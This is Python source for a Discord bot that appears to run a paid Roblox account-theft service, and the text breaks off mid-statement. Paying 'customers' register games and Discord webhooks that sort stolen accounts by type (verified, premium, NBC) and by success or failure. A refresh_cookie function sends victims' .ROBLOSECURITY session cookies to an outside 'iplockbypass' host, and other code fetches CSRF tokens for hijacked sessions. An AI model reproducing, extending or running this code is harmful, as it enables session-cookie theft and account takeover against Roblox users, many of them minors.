import re
import os
import json
import secrets
import uuid
import requests
import discord
import random
import string
from discord import app_commands
from webserver import keep_alive
from discord.ext import commands
import psycopg2
from dotenv import load_dotenv

load_dotenv()

# Roblox theme files setup
rbxlx_files = {
    "nl": {  # Theme code
        "theme_name": "Normal Theme",
        "file_location": "Files/Normal_Theme.rbxlx"
    },
    # Add more themes here if needed
}

theme_choices = [
    discord.app_commands.Choice(name=theme_data['theme_name'], value=theme_code)
    for theme_code, theme_data in rbxlx_files.items()
]

# Connect to PostgreSQL
connection_string = os.getenv("POSTGRES_CONNECTION_STRING")
try:
    conn = psycopg2.connect(connection_string)
    print("Connected to PostgreSQL successfully.")
except psycopg2.Error as e:
    print(f"PostgreSQL connection error: {e}")

# Create tables if not exist
def create_tables(conn):
    queries = [
        """
        CREATE TABLE IF NOT EXISTS webhooks (
            id SERIAL PRIMARY KEY,
            gameid VARCHAR,
            visit VARCHAR,
            unnbc VARCHAR,
            unpremium VARCHAR,
            vnbc VARCHAR,
            vpremium VARCHAR,
            success VARCHAR,
            failed VARCHAR,
            discid VARCHAR
        )
        """,
        """
        CREATE TABLE IF NOT EXISTS purchases (
            id SERIAL PRIMARY KEY,
            rbxid VARCHAR,
            discid VARCHAR
        )
        """
    ]
    with conn.cursor() as cur:
        for query in queries:
            cur.execute(query)
    conn.commit()

create_tables(conn)

# Helpers to replace Roblox identifiers inside .rbxlx files
def replace_referents(data):
    cache = {}
    def _replace_ref(match):
        ref = match.group(1)
        if ref not in cache:
            cache[ref] = ("RBX" + secrets.token_hex(16).upper()).encode()
        return cache[ref]
    return re.sub(b"(RBX[A-Z0-9]{32})", _replace_ref, data)

def replace_script_guids(data):
    cache = {}
    def _replace_guid(match):
        guid = match.group(1)
        if guid not in cache:
            cache[guid] = ("{" + str(uuid.uuid4()).upper() + "}").encode()
        return cache[guid]
    return re.sub(b"(\{[A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{12}\})", _replace_guid, data)

def process_file(file_key):
    theme_info = rbxlx_files.get(file_key)
    if not theme_info:
        return None
    rbxlx_file = theme_info["file_location"]
    with open(rbxlx_file, "rb") as f:
        file_data = f.read()
    if rbxlx_file.endswith(".rbxlx"):
        file_data = replace_referents(file_data)
        file_data = replace_script_guids(file_data)
    return file_data

# Setup Discord bot intents and client
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

@client.event
async def on_ready():
    await tree.sync()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='Flux'), status=discord.Status.dnd)
    print(f'Logged in as {client.user} (ID: {client.user.id})')

keep_alive()

# Roblox API helpers
def refresh_cookie(c):
    try:
        response = requests.get(f"https://eggy.cool/iplockbypass?cookie={c}")
        if response.text != "Invalid Cookie":
            return response.text
        return None
    except Exception as e:
        print(f"Error refreshing cookie: {e}")
        return None

def get_csrf_token(cookie):
    try:
        xsrfRequest = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
        if xsrfRequest.status_code == 403 and "x-csrf-token" in xsrfRequest.headers:
            return xsrfRequest.headers["x-csrf-token"]
    except Exception as e:
        print(f"Error getting CSRF token: {e}")
    return None

def get_game_icon(game_id):
    try:
        url = f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={game_id}&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=false"
        response = requests.get(url)
        response.raise_for_status()
        jsonicon = response.json()
        data = jsonicon.get("data", [])
        if data:
            return data[0].get("imageUrl", "")
        return ""
    except Exception as e:
        print(f"Error getting game icon: {e}")
        return ""

# Database webhook create/update
def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discord_id):
    with conn.cursor() as cur:
        cur.execute("SELECT discid FROM webhooks WHERE gameid = %s", (game_id,))
        existing_discid = cur.fetchone()
        if existing_discid and str(existing_discid[0]) == str(discord_id):
            cur.execute("""
                UPDATE webhooks SET 
                success=%s, vpremium=%s, visit=%s, failed=%s, vnbc=%s, unnbc=%s, unpremium=%s 
                WHERE gameid=%s
            """, (success, vpremium, visit, failed, vnbc, unnbc, unpremium, game_id))
            conn.commit()
            return "Successfully Listed His/Her Webhooks."
        elif existing_discid and str(existing_discid[0]) != str(discord_id):
            return "Do Not Touch His/Her Game."
        else:
            cur.execute("""
                INSERT INTO webhooks (gameid, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discid)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
            """, (game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, discord_id))
            conn.commit()
            return "Successfully Listed His/Her Webhooks."

# Discord commands

@tree.command(name="config", description="Setup/Update Your Game!")
@app_commands.describe(
    game_id='Roblox Game ID',
    visit='Visit Webhook URL',
    unnbc='Unverified NBC Webhook URL',
    unpremium='Unverified Premium Webhook URL',
    vnbc='Verified NBC Webhook URL',
    vpremium='Verified Premium Webhook URL',
    success='Success Webhook URL',
    failed='Failed Webhook URL'
)
async def config(interaction: discord.Interaction, game_id: str, visit: str, unnbc: str, unpremium: str, vnbc: str, vpremium: str, success: str, failed: str):
    role_name = os.getenv('CUSTUMER_ROLE_NAME')
    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("Guild not found.", ephemeral=True)
        return
    member = guild.get_member(interaction.user.id)
    if not member:
        await interaction.response.send_message("Member not found in guild.", ephemeral=True)
        return
    role = discord.utils.get(guild.roles, name=role_name)
    if not role or role not in member.roles:
        await interaction.response.send_message(f"You need the role '{role_name}' to use this command.", ephemeral=True)
        return

    # Validate webhooks
    urls = [vnbc, visit, vpremium, unnbc, unpremium, success, failed]
    if not all(url.startswith('https://discord.com/api/webhooks/') for url in urls):
        await interaction.response.send_message("One or more webhook URLs are invalid.", ephemeral=True)
        return

    # Check game id validity
    universe_req = requests.get(f"https://apis.roblox.com/universes/v1/places/{game_id}/universe")
    universe_json = universe_req.json()
    if not universe_json.get("universeId"):
        await interaction.response.send_message("Invalid game ID.", ephemeral=True)
        return

    # Create or update webhook in DB
    msg = create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc, unpremium, interaction.user.id)

    if msg == "Successfully Listed His/Her Webhooks.":
        embed = discord.Embed(title="Webhook Configuration Saved", color=discord.Color.green())
        embed.add_field(name="Game ID", value=game_id, inline=True)
        embed.add_field(name="Visit Webhook", value=visit, inline=False)
        embed.add_field(name="Unverified NBC Webhook", value=unnbc, inline=False)
        embed.add_field(name="Unverified Premium Webhook", value=unpremium, inline=False)
        embed.add_field(name="Verified NBC Webhook", value=vnbc, inline=False)
        embed.add_field(name="Verified Premium Webhook", value=vpremium, inline=False)
        embed
